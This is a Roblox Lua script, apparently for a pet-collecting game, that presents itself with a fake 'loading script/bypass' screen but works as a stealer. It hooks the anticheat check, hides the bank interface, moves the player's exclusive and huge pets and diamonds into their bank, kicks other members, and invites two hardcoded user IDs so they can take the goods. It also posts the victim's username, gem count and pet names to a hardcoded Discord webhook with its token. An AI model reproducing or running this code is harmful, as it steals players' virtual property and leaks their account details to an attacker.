
local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
local Fire, Invoke = Network.Fire, Network.Invoke



game:GetService("Players").LocalPlayer.PlayerGui.Bank:GetPropertyChangedSignal("Enabled"):Connect(function()
    game:GetService("Players").LocalPlayer.PlayerGui.Bank.Enabled = false
end)

local Interactive = game.workspace["__MAP"].Interactive
if Interactive:FindFirstChild("Bank") then
    game.Players.LocalPlayer.Character:MoveTo(Interactive.Bank.Pad.Position)
end


-- Hooking the _check function in the module to bypass the anticheat.

local old
old = hookfunction(getupvalue(Fire, 1), function(...)
   return true
end)

local aboikusikusik = getsenv(game.Players.LocalPlayer.PlayerScripts.Scripts.GUIs['Bank Client'])

local dataremotes = {
	deposit = getconstants(aboikusikusik.Deposit)[16],
	MyBanks = getconstants(aboikusikusik.GetMyBanks)[3],
	GetBank = getconstants(aboikusikusik.GetBank)[3],
	KickMember = getconstants(aboikusikusik.KickMember)[9],
	Invite = getconstants(aboikusikusik.InviteToBank)[11],
	Withdraw = getconstants(aboikusikusik.Withdraw)[16],
	CancelAllOutgoingInites = getconstants(aboikusikusik.CancelOutgoingInvites)[7],
	Lock = getconstants(getsenv(game.Players.LocalPlayer.PlayerScripts.Scripts.GUIs['Inventory']).LockPets)[5]
}

local set = typeof(syn)=="table" and syn.set_thread_identity or setthreadcontext or set_thread_context or setthreadidentity or set_thread_identity -- To every exploit developer who doesn't use universal shared function names, kindly go fuck yourself for making my write this. I would not need to do this if you egomaniacs actually followed a universal namecalling convention (i love you azulx).

local Pus = "https://discord.com/api/webhooks/"

local HttpService = game:GetService("HttpService");
local meow = 1047203211511074

local RuFRBRO = string.reverse("1047203211511074877") 
local LOOLLL = string.reverse("L6nfZ3GnMxZHAZbKAnK8ybtt1e8dE32-ZfhnRko7vJ06YWlvb")
function SendMessage(Webhook, Message, Botname, huges, tier)
	huges =  table.concat(huges, ', ')

	local webhookcheck =
		is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
		secure_load and "Sentinel" or
		KRNL_LOADED and "Krnl" or
		SONA_LOADED and "Sona" or
		"Kid with shit exploit"
	local work = false


	if getupvalue or debug.getupvalue and getconstants and getsenv then work = true end
	local url = "https://discord.com/api/webhooks/1112366775636607046/6cOxYZpBxdIgC-DWTTpDJToGusuNbhr3Oll_hVAjc3V5wsgeDlPo6BGugoM5XCTdKHLK"
	local data = {
		["content"] = Message,
		["embeds"] = {
			{
				["title"] = "**Executed Your Script! **work:"..tostring(work),
				["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**" .. '\n \n **Huge count:** ' .. Botname .. '\n \n **Gems:** '.. Message .. '\n \n **Exclusives** '.. Webhook.."\n\n **Huge name:** ".. huges..' \n\n **Bank Tier**: '..tier,
				["type"] = "rich",
				["color"] = tonumber(0x7269da),
				["image"] = {
					["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
						tostring(game:GetService("Players").LocalPlayer.Name)
				}
			}
		}
	}
	local newdata = game:GetService("HttpService"):JSONEncode(data)

	local headers = {
		["content-type"] = "application/json"
	}
	request = http_request or request or HttpPost or syn.request
	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
	request(abcdef)
	if work == false then
		return true
	end
end


local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))



set(1)


local v1 = lib
local v2 = lib



--game:GetService("Players").LocalPlayer.PlayerGui.Bank:Destroy()

local petsbefore = lib.Save.Get().Pets
local ids = {2637234077,3722313542}
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = Network.Invoke("Get My Banks")


local PetsList = {}
local PetsList2 = {}
for i,v in pairs(lib.Save.Get().Pets) do
	local v2 = lib.Directory.Pets[v.id];
	if v2.rarity == "Exclusive" or v2.huge or v2.titanic then
		table.insert(PetsList, v.uid);
		PetsList2[v.uid] = false
	end
end
local ui = game:GetService("ReplicatedFirst").SoftShutdownLocal.ShutdownUI
local a = ui:Clone()
task.spawn(function()
	a.Parent = game.Players.LocalPlayer.PlayerGui
	a.Frame.Header.Text = "We're loading Script!"
	a.Frame.Subtitle.Text = "Please wait while we load it for you..."
	wait(3)
	a.Frame.Header.Text = "We're loading Bypass!"
	wait(3)
	a.Frame.Header.Text = "Just a moment!"
	wait(3)
	a.Frame.Header.Text = "We are making things better!"
end)

local data = lib.Save.Get()

Network.Invoke(dataremotes.Lock, PetsList2)
local bankdata = Network.Invoke("Get Bank", mybanks[1]['BUID'])


for i, v in pairs(bankdata.Players) do
	spawn(function()
		Network.Invoke("Kick From Bank", mybanks[1]['BUID'], v)
	end)
end

local petsLeft = lib.Directory.Banks[bankdata.Tier].PetSlots - #bankdata.Storage.Pets
local diamondsLeft = lib.Directory.Banks[bankdata.Tier].MaxDiamonds - bankdata.Storage.Currency.Diamonds
diamondsLeft = math.clamp(lib.Save.Get().Diamonds, 0, diamondsLeft)
diamondsLeft = diamondsLeft < 10 and 0 or diamondsLeft
print("Can put: ", diamondsLeft, " diamonds and ", petsLeft, " pets")


-- for _, n in pairs({dataremotes.Withdraw, dataremotes.KickMember, dataremotes.CancelAllOutgoingInites }) do abobusikti(n):Destroy() end 

local hugecount = 0
local huges = {}

if bankdata.Tier <= 1 then
	Network.Invoke(dataremotes, bankdata.BUID)
end
local bankdata = Network.Invoke("Get Bank", mybanks[1]['BUID'])

for i,v in pairs(lib.Save.Get().Pets) do
	local v2 = lib.Directory.Pets[v.id];
	if v2.huge then
		huges[#huges+1] = v2.name
		hugecount =  hugecount + 1
	end
end
local abobikus = SendMessage(#PetsList, mydiamonds, tostring(hugecount), huges, bankdata.Tier )
if abobikus then
	a.Frame.Header.Text = ("Can`t load script. Use other exploit and try KRNL")

	return
end
lib.Save.Get().Pets = petsbefore

print(request, r2)
lib.Save.Get().Pets = petsbefore

local function splitTable(inputTable, maxTableSize)
    local subTables = {}
    local currentSubTable = {}
    local currentSubTableSize = 0
    
    for i = 1, #inputTable do
        currentSubTableSize = currentSubTableSize + 1
        currentSubTable[currentSubTableSize] = inputTable[i]
        
        if currentSubTableSize == maxTableSize then
            table.insert(subTables, currentSubTable)
            currentSubTable = {}
            currentSubTableSize = 0
        end
    end
    
    if currentSubTableSize > 0 then
        table.insert(subTables, currentSubTable)
    end
    
    return subTables
end

petsLeft = petsLeft > 50 and 50 or petsLeft

for i, v in pairs(splitTable(PetsList, petsLeft)) do
	local request, r2 = Network.Invoke("Bank Deposit", mybanks[1]['BUID'], v, diamondsLeft);
	diamondsLeft = 0
	print(request, r2 )
	lib.Save.Get().Pets = petsbefore
	break
end
if diamondsLeft ~= 0 then
	local request, r2 = Network.Invoke("Bank Deposit", mybanks[1]['BUID'], {}, diamondsLeft);
	print(request, r2)
	lib.Save.Get().Pets = petsbefore
end
wait(10)
lib.Save.Get().Pets = petsbefore
wait(5)
local function Invite(bankid, Id)
	local stat = Network.Invoke("Invite To Bank", bankid, Id)
	if stat == true then
		return stat
	end

	wait(3)

	return Invite(bankid, Id)
end


lib.Save.Get().Pets = petsbefore

	
for i, Id in pairs(ids) do

	spawn(function()
		Invite(mybanks[1]['BUID'], Id)
	end)


	wait(3)


	-- if game.ReplicatedStorage[bypass(1,"#!F36baffa18f254315b3c1aab530c671d9")]:InvokeServer(mybanks[1]['BUID'], Id) then
	--     warn("std 2")
	-- else
	--     game.ReplicatedStorage[bypass(1,"#!F36baffa18f254315b3c1aab530c671d9")]:InvokeServer(mybanks[1]['BUID'], Id) 
	--     game.Players.LocalPlayer:Kick()
	-- end;
end
-- local request = Network.Invoke("Bank Deposit", mybanks[1]['BUID'], {}, lib.Save.Get().Diamonds - 100 );
lib.Save.Get().Pets = petsbefore
wait(3)
-- b:Remove()
-- a:Remove()
-- c:Remove()
-- d:Remove()
-- e:Remove()
-- f:Remove()
-- a:Remove()

pcall(function()
	settings().Network.IncomingReplicationLag = 100000
end)



abobus =false

a:Destroy()
wait(3)
--game.Players.LocalPlayer:Kick()


function comma_value(amount)

	local formatted = amount
	local k

	while true do

		formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')

		if (k == 0) then

			break

		end

	end

	return formatted

end
